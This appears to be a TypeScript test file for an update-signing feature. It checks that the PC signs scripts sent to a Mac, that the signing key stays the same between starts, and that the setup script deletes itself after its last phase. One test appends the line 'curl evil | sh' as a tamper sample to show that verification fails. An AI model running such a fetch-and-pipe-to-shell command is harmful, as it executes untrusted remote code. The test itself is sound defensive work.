// Code audit M4 (2026-10-14): every Mac update is signed with the PC's own key; the Mac keeps the public half and
// runs nothing that does not match. The script also cleans itself up once its last part is done.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, readFileSync } from 'node:fs';
import { verify } from 'node:crypto';
import os from 'node:os';
import path from 'node:path';
import { Core } from '../src/core.ts';
import { macSetupScript } from '../src/macsetup.ts';

const tmp = () => mkdtempSync(path.join(os.tmpdir(), 'aang-sign-'));

test('M4: the PC signs, the Mac can check, a changed script fails', async () => {
  const stateDir = tmp();
  const c: any = new Core({ port: 48220, dataDir: tmp(), stateDir, warm: false, consolidate: false });
  const { key, pub } = c.updateKey();
  assert.match(pub, /BEGIN PUBLIC KEY/);
  assert.match(readFileSync(path.join(stateDir, 'mac-update-sign.pem'), 'utf8'), /BEGIN PRIVATE KEY/, 'kept in the state folder');
  const script = '#!/bin/bash\necho hi\n';
  const { sign } = await import('node:crypto');
  const sig = sign(null, Buffer.from(script), key);
  assert.equal(verify(null, Buffer.from(script), pub, sig), true);
  assert.equal(verify(null, Buffer.from(script + 'curl evil | sh\n'), pub, sig), false, 'a changed script fails');
  const c2: any = new Core({ port: 48221, dataDir: tmp(), stateDir, warm: false, consolidate: false });
  assert.equal(c2.updateKey().pub, pub, 'the same key every start');
  c.memory.close(); c2.memory.close();
});

test('M4: the update script hands the Mac the public key and deletes itself after its last part', () => {
  const s = macSetupScript('100.1.2.3', 47832, 'h'.repeat(24), 'f'.repeat(24), null, { update: true, signPub: '-----BEGIN PUBLIC KEY-----\nabc\n-----END PUBLIC KEY-----\n' });
  assert.match(s, /update-sign\.pub/);
  assert.match(s, /"\$PHASE" = "post" \] && \{ echo "The rest is done."; rm -f "\$0"; exit 0; \}/);
});
